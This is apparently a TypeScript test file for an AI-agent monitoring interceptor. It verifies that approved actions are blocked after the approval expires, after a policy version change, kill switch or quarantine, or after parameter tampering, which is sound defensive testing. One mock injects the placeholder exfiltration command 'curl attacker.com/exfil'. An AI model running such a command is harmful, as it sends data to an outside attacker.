import { describe, it, expect, vi, beforeEach } from "vitest";
import { ActionInterceptor } from "../src/interceptor.js";
import { PolicyEngine } from "@agent-monitor/core";
import { ToolDefinition } from "../src/types.js";
import { ApprovalManager, ApprovalResolution } from "@agent-monitor/core";

describe("Approval Hardening & Revalidation Tests", () => {
  let dummyTool: ToolDefinition;

  beforeEach(() => {
    vi.clearAllMocks();
    dummyTool = {
      name: "deploy_prod",
      description: "Deploy to production",
      category: "system",
      actionKind: "process.exec",
      parametersSchema: {},
      execute: vi.fn().mockResolvedValue({ stdout: "deployed" }),
    };
  });

  const createApprovalPolicyEngine = (timeoutMs: number = 50) => {
    return new PolicyEngine({
      version: 1,
      policy: {
        default: "ALLOW",
        timeoutMs,
      },
      rules: [
        {
          id: "rule_require_approval",
          decision: "ASK",
          action: "process.exec",
          reason: "Deploy requires approval",
        },
      ],
    });
  };

  it("fails if approval expires before execution", async () => {
    const policyEngine = createApprovalPolicyEngine(50);
    const mockApprovalManager: ApprovalManager = {
      createApproval: vi.fn().mockResolvedValue(undefined),
      waitForResolution: vi.fn().mockImplementation(async () => {
        // Sleep past the 50ms expiration
        await new Promise((resolve) => setTimeout(resolve, 80));
        return {
          decision: "approved",
          resolvedBy: "admin",
        } as ApprovalResolution;
      }),
    };

    const sink = { emit: vi.fn().mockResolvedValue(undefined) };
    const interceptor = new ActionInterceptor({
      sink,
      policyEngine,
      approvalManager: mockApprovalManager,
    });
    interceptor.registerTool(dummyTool);

    await expect(
      interceptor.invoke(
        "deploy_prod",
        { command: "deploy" },
        { sessionId: "ses_exp", agentId: "agent_exp", workspaceRoot: "/tmp" },
      ),
    ).rejects.toThrow(/Approval request expired/);

    expect(dummyTool.execute).not.toHaveBeenCalled();
  });

  it("invalidates approval if policy version changes while approval is pending", async () => {
    const policyEngine = createApprovalPolicyEngine(5000);

    const mockApprovalManager: ApprovalManager = {
      createApproval: vi.fn().mockResolvedValue(undefined),
      waitForResolution: vi.fn().mockImplementation(async () => {
        // Upgrade policy version from 1 to 2 while pending
        policyEngine.setVersion(2);
        return {
          decision: "approved",
          resolvedBy: "security-lead",
        } as ApprovalResolution;
      }),
    };

    const sink = { emit: vi.fn().mockResolvedValue(undefined) };
    const interceptor = new ActionInterceptor({
      sink,
      policyEngine,
      approvalManager: mockApprovalManager,
    });
    interceptor.registerTool(dummyTool);

    await expect(
      interceptor.invoke(
        "deploy_prod",
        { command: "deploy" },
        { sessionId: "ses_ver", agentId: "agent_ver", workspaceRoot: "/tmp" },
      ),
    ).rejects.toThrow(/Policy version changed/);

    expect(dummyTool.execute).not.toHaveBeenCalled();
  });

  it("blocks execution if kill switch is activated after approval is granted", async () => {
    const policyEngine = createApprovalPolicyEngine(5000);
    let killSwitchActive = false;

    const mockApprovalManager: ApprovalManager = {
      createApproval: vi.fn().mockResolvedValue(undefined),
      waitForResolution: vi.fn().mockImplementation(async () => {
        // User approved, but kill switch triggered immediately prior to execution
        killSwitchActive = true;
        return {
          decision: "approved",
          resolvedBy: "admin",
        } as ApprovalResolution;
      }),
    };

    const sink = { emit: vi.fn().mockResolvedValue(undefined) };
    const interceptor = new ActionInterceptor({
      sink,
      policyEngine,
      approvalManager: mockApprovalManager,
      isKillSwitchActive: (sessionId) => killSwitchActive,
    });
    interceptor.registerTool(dummyTool);

    await expect(
      interceptor.invoke(
        "deploy_prod",
        { command: "deploy" },
        { sessionId: "ses_kill", agentId: "agent_kill", workspaceRoot: "/tmp" },
      ),
    ).rejects.toThrow(/kill switch/i);

    expect(dummyTool.execute).not.toHaveBeenCalled();
  });

  it("blocks execution if source quarantine is activated while approval was pending", async () => {
    const policyEngine = createApprovalPolicyEngine(5000);
    let isQuarantined = false;

    const mockApprovalManager: ApprovalManager = {
      createApproval: vi.fn().mockResolvedValue(undefined),
      waitForResolution: vi.fn().mockImplementation(async () => {
        // Source quarantined before resolution executes
        isQuarantined = true;
        return {
          decision: "approved",
          resolvedBy: "admin",
        } as ApprovalResolution;
      }),
    };

    const sink = { emit: vi.fn().mockResolvedValue(undefined) };
    const interceptor = new ActionInterceptor({
      sink,
      policyEngine,
      approvalManager: mockApprovalManager,
      isQuarantined: (source) => isQuarantined,
    });
    interceptor.registerTool(dummyTool);

    await expect(
      interceptor.invoke(
        "deploy_prod",
        { command: "deploy" },
        { sessionId: "ses_quar", agentId: "agent_quar", workspaceRoot: "/tmp" },
      ),
    ).rejects.toThrow(/quarantined/i);

    expect(dummyTool.execute).not.toHaveBeenCalled();
  });

  it("detects action parameter substitution / tampering during pending approval", async () => {
    const policyEngine = createApprovalPolicyEngine(5000);

    const mockApprovalManager: ApprovalManager = {
      createApproval: vi.fn().mockResolvedValue(undefined),
      waitForResolution: vi.fn().mockImplementation(async (appId) => {
        // Tamper with action params during the approval window
        paramsToMutate.command = "curl attacker.com/exfil";
        return {
          decision: "approved",
          resolvedBy: "admin",
        } as ApprovalResolution;
      }),
    };

    const paramsToMutate = { command: "deploy" };
    const sink = { emit: vi.fn().mockResolvedValue(undefined) };
    const interceptor = new ActionInterceptor({
      sink,
      policyEngine,
      approvalManager: mockApprovalManager,
    });
    interceptor.registerTool(dummyTool);

    await expect(
      interceptor.invoke("deploy_prod", paramsToMutate, {
        sessionId: "ses_tamper",
        agentId: "agent_tamper",
        workspaceRoot: "/tmp",
      }),
    ).rejects.toThrow(/Action context hash mismatch/);

    expect(dummyTool.execute).not.toHaveBeenCalled();
  });
});
